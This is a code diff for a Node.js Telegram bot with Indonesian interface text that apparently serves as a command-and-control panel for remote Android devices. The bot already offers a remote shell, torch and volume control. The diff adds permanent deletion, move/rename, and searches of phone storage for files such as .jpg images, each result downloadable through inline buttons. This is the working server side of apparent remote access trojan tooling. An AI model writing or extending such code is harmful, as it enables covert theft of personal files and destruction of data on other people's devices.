@@ -243,6 +243,9 @@ const commandsWithArgs = {
     'shell': 'Masukkan perintah Shell/Terminal:',
     'torch': 'Masukkan status Torch (on/off):',
     'set_volume': 'Masukkan format [tipe] [angka] (Cth: music 10) atau ketik "get" untuk cek status:',
+    'rm': 'Masukkan path file/folder yang ingin DIHAPUS PERMANEN:',
+    'mv': 'Masukkan format [path_asal]|[path_baru] untuk Move/Rename:',
+    'find': 'Masukkan format [root_path]|[ekstensi] (Cth: /storage/emulated/0|.jpg):',
     'play_sound': 'Masukkan direct URL tautan file mp3 yang ingin diputar di latar belakang:'
 };
 
@@ -268,28 +271,40 @@ const sendExplorerPage = async (client_id, pageNum, chat_id, message_id = null) 
     const upPath = state.path.substring(0, state.path.lastIndexOf('/')) || '/';
     const flatBtns = [];
 
-    // Tombol naik 1 level
+    // Tombol Navigasi & Search
+    const navBar = [];
     if (state.path !== '/') {
         const upId = Math.random().toString(36).substring(2, 10);
         pathMap[upId] = upPath;
-        flatBtns.push(Markup.button.callback('⬆️ Naik 1 Folder', 'runcmd:' + client_id + ':ls_id ' + upId));
+        navBar.push(Markup.button.callback('⬆️ Naik', 'runcmd:' + client_id + ':ls_id ' + upId));
+    }
+    navBar.push(Markup.button.callback('🔍 Cari (.ext)', 'runcmd:' + client_id + ':find ' + state.path + '|'));
+    flatBtns.push(navBar);
+
+    // Pisahkan Folder dan File untuk pengurutan visual (Tambahan redundansi sorting di server)
+    const folders = state.items.filter(i => i.is_dir);
+    const files = state.items.filter(i => !i.is_dir);
+    const sortedItems = [...folders, ...files];
+
+    // Tampilkan 2 kolom
+    for (let i = 0; i < pageItems.length; i += 2) {
+        const row = [];
+        [pageItems[i], pageItems[i + 1]].forEach(f => {
+            if (!f) return;
+            const shortId = Math.random().toString(36).substring(2, 10);
+            pathMap[shortId] = f.path;
+            if (f.is_dir) {
+                row.push(Markup.button.callback('📁 ' + f.name.substring(0, 18), 'runcmd:' + client_id + ':ls_id ' + shortId));
+            } else {
+                const sizeKB = Math.round(f.size / 1024);
+                // Ganti dari dl_id menjadi file_menu agar ada opsi Rename/Delete
+                row.push(Markup.button.callback('📄 ' + f.name.substring(0, 15), 'file_menu:' + client_id + ':' + shortId));
+            }
+        });
+        flatBtns.push(row);
     }
 
-    pageItems.forEach(f => {
-        const shortId = Math.random().toString(36).substring(2, 10);
-        pathMap[shortId] = f.path;
-        if (f.is_dir) {
-            flatBtns.push(Markup.button.callback('📁 ' + f.name.substring(0, 20), 'runcmd:' + client_id + ':ls_id ' + shortId));
-        } else {
-            const sizeKB = Math.round(f.size / 1024);
-            flatBtns.push(Markup.button.callback('📄 ' + f.name.substring(0, 20) + ' (' + sizeKB + ' KB)', 'runcmd:' + client_id + ':dl_id ' + shortId));
-        }
-    });
-
-    const inlineBtns = [];
-    for (let i = 0; i < flatBtns.length; i += 2) {
-        inlineBtns.push(flatBtns.slice(i, i + 2));
-    }
+    const inlineBtns = [...flatBtns];
 
     // Pagination buttons
     const navBtns = [];
@@ -633,6 +648,26 @@ Format Eksekusi Manual:
         notifyClient(devId, { id: cmdId, command: realCmdName, text: cmdText });
     });
 
+    bot.action(/^file_menu:(.+):(.+)$/, async (ctx) => {
+        const devId = ctx.match[1];
+        const shortId = ctx.match[2];
+        const filePath = pathMap[shortId];
+        if (!filePath) return ctx.answerCbQuery('❌ Sesi kedaluwarsa.');
+
+        const fileName = filePath.substring(filePath.lastIndexOf('/') + 1);
+        const caption = `📄 <b>File:</b> <code>${escapeHTML(fileName)}</code>\n📍 <b>Path:</b> <code>${escapeHTML(filePath)}</code>\n\nPilih operasi yang ingin dilakukan:`;
+
+        const menu = [
+            [{ text: '📥 Download', callback_data: `runcmd:${devId}:download ${filePath}` }],
+            [{ text: '✏️ Rename / Move', callback_data: `runcmd:${devId}:mv ${filePath}|` }, { text: '🗑 Hapus', callback_data: `runcmd:${devId}:rm ${filePath}`, style: 'danger' }],
+            [{ text: '🔙 Kembali ke Folder', callback_data: `runcmd:${devId}:ls ${filePath.substring(0, filePath.lastIndexOf('/'))}` }]
+        ];
+
+        await clearPreviousNav(ctx.chat.id);
+        const sent = await ctx.reply(caption, { parse_mode: 'HTML', reply_markup: { inline_keyboard: menu } });
+        trackNav(ctx.chat.id, sent.message_id);
+    });
+
     bot.action(/^pagecmd:(.+):(.+)$/, async (ctx) => {
         const devId = ctx.match[1];
         const pageNum = parseInt(ctx.match[2]);
@@ -942,6 +977,30 @@ app.post('/response', async (req, res) => {
                     };
                     await sendExplorerPage(client_id, 1, cmd.chat_id, cmd.message_id);
                     // sendExplorerPage handle trackNav inside
+                    return res.json({ status: 'received' });
+                }
+
+                if (data.type === 'find_result' && Array.isArray(deviceResponse)) {
+                    await clearPreviousNav(cmd.chat_id);
+                    if (deviceResponse.length === 0) {
+                        await sendOrEdit('🔍 <b>Hasil Pencarian:</b> Tidak ditemukan file yang cocok.');
+                        return res.json({ status: 'received' });
+                    }
+
+                    const buttons = [];
+                    deviceResponse.slice(0, 40).forEach(f => {
+                        const shortId = Math.random().toString(36).substring(2, 10);
+                        pathMap[shortId] = f.path;
+                        buttons.push([{ text: `📄 ${f.name} (${Math.round(f.size / 1024)} KB)`, callback_data: `file_menu:${client_id}:${shortId}` }]);
+                    });
+
+                    const caption = `🔍 <b>Hasil Pencarian [${escapeHTML(client_id)}]:</b>\nMenampilkan ${Math.min(deviceResponse.length, 40)} file teratas.\n<i>(Klik file untuk opsi)</i>`;
+                    const sent = await bot.telegram.sendMessage(cmd.chat_id, caption, {
+                        parse_mode: 'HTML',
+                        reply_markup: { inline_keyboard: [...buttons, [{ text: '🔙 Menu Utama', callback_data: `select_dev:${client_id}` }]] }
+                    });
+                    trackNav(cmd.chat_id, sent.message_id);
+                    if (cmd.message_id) bot.telegram.deleteMessage(cmd.chat_id, parseInt(cmd.message_id)).catch(() => { });
                     return res.json({ status: 'received' });
                 }
 
